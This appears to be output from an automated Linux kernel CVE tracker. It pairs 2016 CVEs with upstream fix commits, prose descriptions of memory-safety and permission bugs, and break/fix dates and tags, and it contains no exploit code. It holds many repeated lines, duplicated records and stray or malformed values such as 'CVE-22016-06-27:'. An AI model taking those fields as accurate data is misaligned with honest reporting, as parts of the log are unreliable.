Break Tag: 3.7
Linus Fix Date: 2016-09-07
Linus Commit: ded89912156b1a47d940a0c954c43afbabd0c42c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit fac8e0f579695a3ecbc4d3cac369139d7f819971
Author: Jesse Gross <jesse@kernel.org>
Date:   Sat Mar 19 09:32:01 2016 -0700

    tunnels: Don't apply GRO to multiple layers of encapsulation.
    
    When drivers express support for TSO of encapsulated packets, they
    only mean that they can do it for one layer of encapsulation.
    Supporting additional levels would mean updating, at a minimum,
    more IP length fields and they are unaware of this.
    
    No encapsulation device expresses support for handling offloaded
    encapsulated packets, so we won't generate these types of frames
    in the transmit path. However, GRO doesn't have a check for
    multiple levels of encapsulation and will attempt to build them.
    
    UDP tunnel GRO actually does prevent this situation but it only
    handles multiple UDP tunnels stacked on top of each other. This
    generalizes that solution to prevent any kind of tunnel stacking
    that would cause problems.
    
    Fixes: bf5a755f ("net-gre-gro: Add GRE support to the GRO stack")
    Signed-off-by: Jesse Gross <jesse@kernel.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/linux/netdevice.h |    4 ++--
 net/core/dev.c            |    2 +-
 net/ipv4/af_inet.c        |   15 ++++++++++++++-
 net/ipv4/gre_offload.c    |    5 +++++
 net/ipv4/udp_offload.c    |    6 +++---
 net/ipv6/ip6_offload.c    |   15 ++++++++++++++-
 6 files changed, 39 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8666
Break Date: 2014-01-07
Break Commit: bf5a755f5e9186406bbf50f4087100af5bd68e40
Break Tag: 3.14
Linus Fix Date: 2016-03-20
Linus Commit: fac8e0f579695a3ecbc4d3cac369139d7f819971
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Thu Sep 15 16:44:56 2016 +0300

    scsi: arcmsr: Buffer overflow in arcmsr_iop_message_xfer()
    
    We need to put an upper bound on "user_len" so the memcpy() doesn't
    overflow.
    
    Cc: <stable@vger.kernel.org>
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Tomas Henzl <thenzl@redhat.com>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/arcmsr/arcmsr_hba.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7425
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-15
Linus Commit: 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
2012-09-28:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit ded89912156b1a47d940a0c954c43afbabd0c42c
Author: Arend Van Spriel <arend.vanspriel@broadcom.com>
Date:   Mon Sep 5 10:45:47 2016 +0100

    brcmfmac: avoid potential stack overflow in brcmf_cfg80211_start_ap()
    
    User-space can choose to omit NL80211_ATTR_SSID and only provide raw
    IE TLV data. When doing so it can provide SSID IE with length exceeding
    the allowed size. The driver further processes this IE copying it
    into a local variable without checking the length. Hence stack can be
    corrupted and used as exploit.
    
    Cc: stable@vger.kernel.org # v4.7
    Reported-by: Daxing Guo <freener.gdx@gmail.com>
    Reviewed-by: Hante Meuleman <hante.meuleman@broadcom.com>
    Reviewed-by: Pieter-Paul Giesberts <pieter-paul.giesberts@broadcom.com>
    Reviewed-by: Franky Lin <franky.lin@broadcom.com>
    Signed-off-by: Arend van Spriel <arend.vanspriel@broadcom.com>
    Signed-off-by: Kalle Valo <kvalo@codeaurora.org>

 .../broadcom/brcm80211/brcmfmac/cfg80211.c         |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8658
Break Date: 2012-09-28
Break Commit: 1a87334239757b69eb9885979c32bbf871b3ec88
Break Tag: 3.7
Linus Fix Date: 2016-09-07
Linus Commit: ded89912156b1a47d940a0c954c43afbabd0c42c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit fac8e0f579695a3ecbc4d3cac369139d7f819971
Author: Jesse Gross <jesse@kernel.org>
Date:   Sat Mar 19 09:32:01 2016 -0700

    tunnels: Don't apply GRO to multiple layers of encapsulation.
    
    When drivers express support for TSO of encapsulated packets, they
    only mean that they can do it for one layer of encapsulation.
    Supporting additional levels would mean updating, at a minimum,
    more IP length fields and they are unaware of this.
    
    No encapsulation device expresses support for handling offloaded
    encapsulated packets, so we won't generate these types of frames
    in the transmit path. However, GRO doesn't have a check for
    multiple levels of encapsulation and will attempt to build them.
    
    UDP tunnel GRO actually does prevent this situation but it only
    handles multiple UDP tunnels stacked on top of each other. This
    generalizes that solution to prevent any kind of tunnel stacking
    that would cause problems.
    
    Fixes: bf5a755f ("net-gre-gro: Add GRE support to the GRO stack")
    Signed-off-by: Jesse Gross <jesse@kernel.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/linux/netdevice.h |    4 ++--
 net/core/dev.c            |    2 +-
 net/ipv4/af_inet.c        |   15 ++++++++++++++-
 net/ipv4/gre_offload.c    |    5 +++++
 net/ipv4/udp_offload.c    |    6 +++---
 net/ipv6/ip6_offload.c    |   15 ++++++++++++++-
 6 files changed, 39 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8666
Break Date: 2014-01-07
Break Commit: bf5a755f5e9186406bbf50f4087100af5bd68e40
Break Tag: 3.14
Linus Fix Date: 2016-03-20
Linus Commit: fac8e0f579695a3ecbc4d3cac369139d7f819971
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7042
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: -
Linus Commit: local-2016-7042
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7097:
CVE-2016-7097:
-:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 073931017b49d9458aa351605b43a7e34598caef
Author: Jan Kara <jack@suse.cz>
Date:   Mon Sep 19 17:39:09 2016 +0200

    posix_acl: Clear SGID bit when setting file permissions
    
    When file permissions are modified via chmod(2) and the user is not in
    the owning group or capable of CAP_FSETID, the setgid bit is cleared in
    inode_change_ok().  Setting a POSIX ACL via setxattr(2) sets the file
    permissions as well as the new ACL, but doesn't clear the setgid bit in
    a similar way; this allows to bypass the check in chmod(2).  Fix that.
    
    References: CVE-2016-7097
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Reviewed-by: Jeff Layton <jlayton@redhat.com>
    Signed-off-by: Jan Kara <jack@suse.cz>
    Signed-off-by: Andreas Gruenbacher <agruenba@redhat.com>

 fs/9p/acl.c               |   40 +++++++++++++++++-----------------------
 fs/btrfs/acl.c            |    6 ++----
 fs/ceph/acl.c             |    6 ++----
 fs/ext2/acl.c             |   12 ++++--------
 fs/ext4/acl.c             |   12 ++++--------
 fs/f2fs/acl.c             |    6 ++----
 fs/gfs2/acl.c             |   12 +++---------
 fs/hfsplus/posix_acl.c    |    4 ++--
 fs/jffs2/acl.c            |    9 ++++-----
 fs/jfs/acl.c              |    6 ++----
 fs/ocfs2/acl.c            |   10 ++++------
 fs/orangefs/acl.c         |   15 +++++----------
 fs/posix_acl.c            |   31 +++++++++++++++++++++++++++++++
 fs/reiserfs/xattr_acl.c   |    8 ++------
 fs/xfs/xfs_acl.c          |   13 ++++---------
 include/linux/posix_acl.h |    1 +
 16 files changed, 89 insertions(+), 102 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7097
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-22
Linus Commit: 073931017b49d9458aa351605b43a7e34598caef
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7117:
2.6:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-22016-06-27:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.67.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 34b88a68f26a75e4fded796f1a49c40f82234b7d
Author: Arnaldo Carvalho de Melo <acme@redhat.com>
Date:   Mon Mar 14 09:56:35 2016 -0300

    net: Fix use after free in the recvmmsg exit path
    
    The syzkaller fuzzer hit the following use-after-free:
    
      Call Trace:
       [<ffffffff8175ea0e>] __asan_report_load8_noabort+0x3e/0x40 mm/kasan/report.c:295
       [<ffffffff851cc31a>] __sys_recvmmsg+0x6fa/0x7f0 net/socket.c:2261
       [<     inline     >] SYSC_recvmmsg net/socket.c:2281
       [<ffffffff851cc57f>] SyS_recvmmsg+0x16f/0x180 net/socket.c:2270
       [<ffffffff86332bb6>] entry_SYSCALL_64_fastpath+0x16/0x7a
      arch/x86/entry/entry_64.S:185
    
    And, as Dmitry rightly assessed, that is because we can drop the
    reference and then touch it when the underlying recvmsg calls return
    some packets and then hit an error, which will make recvmmsg to set
    sock->sk->sk_err, oops, fix it.
    
    Reported-and-Tested-by: Dmitry Vyukov <dvyukov@google.com>
    Cc: Alexander Potapenko <glider@google.com>
    Cc: Eric Dumazet <edumazet@google.com>
    Cc: Kostya Serebryany <kcc@google.com>
    Cc: Sasha Levin <sasha.levin@oracle.com>
    Fixes: a2e2725541fa ("net: Introduce recvmmsg socket syscall")
    http://lkml.kernel.org/r/20160122211644.GC2470@redhat.com
    Signed-off-by: Arnaldo Carvalho de Melo <acme@redhat.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/socket.c |   38 +++++++++++++++++++-------------------
 1 file changed, 19 insertions(+), 19 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-10
CVE: CVE-2016-7117
Break Date: 2009-10-12
Break Commit: a2e2725541fad72416326798c2d7fa4dafb7d337
Break Tag: 2.6
Linus Fix Date: 2016-03-14
Linus Commit: 34b88a68f26a75e4fded796f1a49c40f82234b7d
Linus Tag: 4.6
Stable Date: 2016-04-20
Stable Commit: 902b916d00ba73095b58a9a8dfe926c6a7f635d5
Stable Tag: 3.14.67

CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Thu Sep 15 16:44:56 2016 +0300

    scsi: arcmsr: Buffer overflow in arcmsr_iop_message_xfer()
    
    We need to put an upper bound on "user_len" so the memcpy() doesn't
    overflow.
    
    Cc: <stable@vger.kernel.org>
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Tomas Henzl <thenzl@redhat.com>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/arcmsr/arcmsr_hba.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7425
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-15
Linus Commit: 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
2012-09-28:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit ded89912156b1a47d940a0c954c43afbabd0c42c
Author: Arend Van Spriel <arend.vanspriel@broadcom.com>
Date:   Mon Sep 5 10:45:47 2016 +0100

    brcmfmac: avoid potential stack overflow in brcmf_cfg80211_start_ap()
    
    User-space can choose to omit NL80211_ATTR_SSID and only provide raw
    IE TLV data. When doing so it can provide SSID IE with length exceeding
    the allowed size. The driver further processes this IE copying it
    into a local variable without checking the length. Hence stack can be
    corrupted and used as exploit.
    
    Cc: stable@vger.kernel.org # v4.7
    Reported-by: Daxing Guo <freener.gdx@gmail.com>
    Reviewed-by: Hante Meuleman <hante.meuleman@broadcom.com>
    Reviewed-by: Pieter-Paul Giesberts <pieter-paul.giesberts@broadcom.com>
    Reviewed-by: Franky Lin <franky.lin@broadcom.com>
    Signed-off-by: Arend van Spriel <arend.vanspriel@broadcom.com>
    Signed-off-by: Kalle Valo <kvalo@codeaurora.org>

 .../broadcom/brcm80211/brcmfmac/cfg80211.c         |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8658
Break Date: 2012-09-28
Break Commit: 1a87334239757b69eb9885979c32bbf871b3ec88
Break Tag: 3.7
Linus Fix Date: 2016-09-07
Linus Commit: ded89912156b1a47d940a0c954c43afbabd0c42c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit fac8e0f579695a3ecbc4d3cac369139d7f819971
Author: Jesse Gross <jesse@kernel.org>
Date:   Sat Mar 19 09:32:01 2016 -0700

    tunnels: Don't apply GRO to multiple layers of encapsulation.
    
    When drivers express support for TSO of encapsulated packets, they
    only mean that they can do it for one layer of encapsulation.
    Supporting additional levels would mean updating, at a minimum,
    more IP length fields and they are unaware of this.
    
    No encapsulation device expresses support for handling offloaded
    encapsulated packets, so we won't generate these types of frames
    in the transmit path. However, GRO doesn't have a check for
    multiple levels of encapsulation and will attempt to build them.
    
    UDP tunnel GRO actually does prevent this situation but it only
    handles multiple UDP tunnels stacked on top of each other. This
    generalizes that solution to prevent any kind of tunnel stacking
    that would cause problems.
    
    Fixes: bf5a755f ("net-gre-gro: Add GRE support to the GRO stack")
    Signed-off-by: Jesse Gross <jesse@kernel.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/linux/netdevice.h |    4 ++--
 net/core/dev.c            |    2 +-
 net/ipv4/af_inet.c        |   15 ++++++++++++++-
 net/ipv4/gre_offload.c    |    5 +++++
 net/ipv4/udp_offload.c    |    6 +++---
 net/ipv6/ip6_offload.c    |   15 ++++++++++++++-
 6 files changed, 39 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8666
Break Date: 2014-01-07
Break Commit: bf5a755f5e9186406bbf50f4087100af5bd68e40
Break Tag: 3.14
Linus Fix Date: 2016-03-20
Linus Commit: fac8e0f579695a3ecbc4d3cac369139d7f819971
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6516:
54dbc15172375641ef03399e8f911d7165eb90fb:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 10eec60ce79187686e052092e5383c99b4420a20
Author: Scott Bauer <sbauer@plzdonthack.me>
Date:   Wed Jul 27 19:11:29 2016 -0600

    vfs: ioctl: prevent double-fetch in dedupe ioctl
    
    This prevents a double-fetch from user space that can lead to to an
    undersized allocation and heap overflow.
    
    Fixes: 54dbc1517237 ("vfs: hoist the btrfs deduplication ioctl to the vfs")
    Signed-off-by: Scott Bauer <sbauer@plzdonthack.me>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 fs/ioctl.c |    1 +
 1 file changed, 1 insertion(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6516
Break Date: 2016-01-01
Break Commit: 54dbc15172375641ef03399e8f911d7165eb90fb
Break Tag: 4.5
Linus Fix Date: 2016-07-28
Linus Commit: 10eec60ce79187686e052092e5383c99b4420a20
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
6859d49475d4f32abe640372117e4b687906e6b6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit bb1fceca22492109be12640d49f5ea5a544c6bb4
Author: Eric Dumazet <edumazet@google.com>
Date:   Wed Aug 17 05:56:26 2016 -0700

    tcp: fix use after free in tcp_xmit_retransmit_queue()
    
    When tcp_sendmsg() allocates a fresh and empty skb, it puts it at the
    tail of the write queue using tcp_add_write_queue_tail()
    
    Then it attempts to copy user data into this fresh skb.
    
    If the copy fails, we undo the work and remove the fresh skb.
    
    Unfortunately, this undo lacks the change done to tp->highest_sack and
    we can leave a dangling pointer (to a freed skb)
    
    Later, tcp_xmit_retransmit_queue() can dereference this pointer and
    access freed memory. For regular kernels where memory is not unmapped,
    this might cause SACK bugs because tcp_highest_sack_seq() is buggy,
    returning garbage instead of tp->snd_nxt, but with various debug
    features like CONFIG_DEBUG_PAGEALLOC, this can crash the kernel.
    
    This bug was found by Marco Grassi thanks to syzkaller.
    
    Fixes: 6859d49475d4 ("[TCP]: Abstract tp->highest_sack accessing & point to next skb")
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Eric Dumazet <edumazet@google.com>
    Cc: Ilpo Jrvinen <ilpo.jarvinen@helsinki.fi>
    Cc: Yuchung Cheng <ycheng@google.com>
    Cc: Neal Cardwell <ncardwell@google.com>
    Acked-by: Neal Cardwell <ncardwell@google.com>
    Reviewed-by: Cong Wang <xiyou.wangcong@gmail.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/net/tcp.h |    2 ++
 1 file changed, 2 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-6828
Break Date: 2008-01-28
